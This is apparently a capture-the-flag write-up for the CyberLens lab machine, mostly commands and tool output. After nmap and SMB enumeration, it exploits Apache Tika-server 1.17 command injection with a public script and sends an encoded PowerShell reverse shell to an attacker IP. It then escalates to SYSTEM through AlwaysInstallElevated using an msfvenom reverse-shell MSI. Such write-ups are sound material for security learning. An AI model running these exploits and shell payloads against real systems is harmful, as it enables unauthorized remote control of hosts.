## INFORMATION GATHERING
```bash
# IP ADDRESS
10.10.85.146
# HOSTNAME
CyberLens
# OPERATING SYSTEM
OS Name:                   Microsoft Windows Server 2019 Datacenter
OS Version:                10.0.17763 N/A Build 17763
# CREDENTIALS  

```
## OPEN PORTS DETAILS
```bash
80/tcp    open  http          syn-ack ttl 125 Apache httpd 2.4.57 ((Win64))

135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC

139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 125

3389/tcp  open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services

5985/tcp  open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

7680/tcp  open  pando-pub?    syn-ack ttl 125

47001/tcp open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

49664/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49676/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC

61777/tcp open  http          syn-ack ttl 125 Jetty 8.y.z-SNAPSHOT
```
# ENUMERATION
## PORT 139 445
```bash
- Listing Shares :(
sudo crackmapexec smb $ip --shares -u 'anonymous' -p ''
SMB         10.10.85.146    445    CYBERLENS        [*] Windows 10 / Server 2019 Build 17763 x64 (name:CYBERLENS) (domain:CyberLens) (signing:False) (SMBv1:False)
SMB         10.10.85.146    445    CYBERLENS        [-] CyberLens\anonymous: STATUS_LOGON_FAILURE 

sudo smbclient -L $ip
Password for [WORKGROUP\root]:
session setup failed: NT_STATUS_ACCESS_DENIED
```
## PORT 61777
```bash
- Found Exploit for Apache Tika-Server 1.17
Apache Tika-server < 1.18 - Command Injection | windows/remote/46540.py

- Testing the expolit
python 46540.py cyberlens.thm 61777 'curl http://10.13.80.25/test'

sudo python3 -m http.server 80                             
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.85.146 - - [08/Mar/2025 19:27:19] code 404, message File not found
10.10.85.146 - - [08/Mar/2025 19:27:19] "GET /test HTTP/1.1" 404 -

- Able to Execute Command
```
## INITIAL FOOTHOLD
```bash
# Reverse Shell - Encoded powershell reverse shell using https://www.revshells.com/
python 46540.py cyberlens.thm 61777 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAzAC4AOAAwAC4AMgA1ACIALAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA='

sudo rlwrap nc -nvlp 444 
listening on [any] 444 ...
connect to [10.13.80.25] from (UNKNOWN) [10.10.85.146] 49803
PS C:\Windows\system32> cd C:\
PS C:\> whoami
cyberlens\cyberlens
```
## PRIVILEGE ESCALATION
```bash
# AlwaysElevated
- Runnung winpeas
??????????? Checking AlwaysInstallElevated
?  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!

# Privesc
sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.80.25 LPORT=444 -f msi -o reverse.msi

- Transfer reverse.msi
Invoke-WebRequest -Uri http://10.13.80.25/reverse.msi -OutFile C:\Windows\Tasks\reverse.msi

PS C:\Windows\Tasks> msiexec /quiet /qn /i reverse.msi

sudo rlwrap nc -nvlp 444                                   
listening on [any] 444 ...
connect to [10.13.80.25] from (UNKNOWN) [10.10.85.146] 49854
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.95 scan initiated Sat Mar  8 19:15:25 2025 as: /usr/lib/nmap/nmap -p 80,135,139,445,3389,5985,7680,47001,49664,49665,49666,49667,49668,49669,49670,49676,61777 -sC -sV -vv -oN nmap/scan-script-version 10.10.85.146
Nmap scan report for cyberlens.thm (10.10.85.146)
Host is up, received reset ttl 125 (0.36s latency).
Scanned at 2025-03-08 19:15:26 IST for 75s

PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 125 Apache httpd 2.4.57 ((Win64))
|_http-server-header: Apache/2.4.57 (Win64)
|_http-title: CyberLens: Unveiling the Hidden Matrix
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 125
3389/tcp  open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
| ssl-cert: Subject: commonName=CyberLens
| Issuer: commonName=CyberLens
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-07T13:41:36
| Not valid after:  2025-09-06T13:41:36
| MD5:   5999:ce9d:bd7f:7598:b55c:d987:0803:410a
| SHA-1: 80e6:8abb:d6b0:5cca:21e8:0c64:c174:ea97:7ae9:54ea
| -----BEGIN CERTIFICATE-----
| MIIC1jCCAb6gAwIBAgIQYdnqx1mMbZhK88JzwNT7cTANBgkqhkiG9w0BAQsFADAU
| MRIwEAYDVQQDEwlDeWJlckxlbnMwHhcNMjUwMzA3MTM0MTM2WhcNMjUwOTA2MTM0
| MTM2WjAUMRIwEAYDVQQDEwlDeWJlckxlbnMwggEiMA0GCSqGSIb3DQEBAQUAA4IB
| DwAwggEKAoIBAQCwunHAjDFcfq5gqxPdyn7cyhrJ/Fpq3CE353qaBiRCd51g6wXH
| tPcVjrpYXF0ydwwpQ8No5QBpHNVCvht1OAIgOvGy18rSSwAXSEFm748X6ZoB4XGJ
| w0qVgIzzC2EfHyuWqf10XNOEIuihFr+qsziJGyshGX4u7E3ijL7fTN+4DuLBtrzP
| ialXzy9xz5TDXZ2U8uVyDrodlU3usnGBGaGeWF6iQcU1eUequ6OXziVTtYOEEAmh
| pVFOzK7FjPIotCdwhYT4FBB4cGpzQGQs7i4VdolseRp5atw2jGdIp8EFzKDiUvCj
| w6Z/GqVWC0BWWvHvhIM3q7P21XKOg1W+MzFVAgMBAAGjJDAiMBMGA1UdJQQMMAoG
| CCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsFAAOCAQEAegtHleu4
| Cz8ogDeGSH22+Jd4iZR290kFW9p9XkdB4GRiELs//BNwze6SeeT1E8A4uBNxTfKE
| 5G9ntEduIhVwKdpFfkl4dvuUu0I4uciC6M/sHJvYSPy1hDV39acNPV14EenSU0ZV
| wNn1kxw4jkUlqW0UobVq7r0xdIH+j/lIwHNrFToLp1Aw+APV1DeDXv+SrhyzrU3I
| 1YOW7WvJBEgtqdp/xL8nIACq1LoqWvkRVj0866ewyGlI6AuoSoujM8mDQNj9GkYq
| j9aRpBj9MFS8EP8ssair+1Ooxtz4TgxH9CnEtIm3C5d7hLm+SxYdWsmmBwSoX2Ed
| zOvYZ2pB8HhurQ==
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: CYBERLENS
|   NetBIOS_Domain_Name: CYBERLENS
|   NetBIOS_Computer_Name: CYBERLENS
|   DNS_Domain_Name: CyberLens
|   DNS_Computer_Name: CyberLens
|   Product_Version: 10.0.17763
|_  System_Time: 2025-03-08T13:46:31+00:00
|_ssl-date: 2025-03-08T13:46:40+00:00; 0s from scanner time.
5985/tcp  open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp  open  pando-pub?    syn-ack ttl 125
47001/tcp open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49676/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
61777/tcp open  http          syn-ack ttl 125 Jetty 8.y.z-SNAPSHOT
|_http-title: Welcome to the Apache Tika 1.17 Server
|_http-server-header: Jetty(8.y.z-SNAPSHOT)
|_http-cors: HEAD GET
| http-methods: 
|   Supported Methods: POST GET PUT OPTIONS HEAD
|_  Potentially risky methods: PUT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-03-08T13:46:33
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 29189/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 50582/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 46253/udp): CLEAN (Failed to receive data)
|   Check 4 (port 60133/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 0s, deviation: 0s, median: 0s

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Mar  8 19:16:41 2025 -- 1 IP address (1 host up) scanned in 76.07 seconds
```

